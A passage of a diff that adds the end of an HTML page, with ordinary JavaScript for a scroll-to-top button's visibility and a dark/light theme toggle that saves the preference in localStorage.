+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
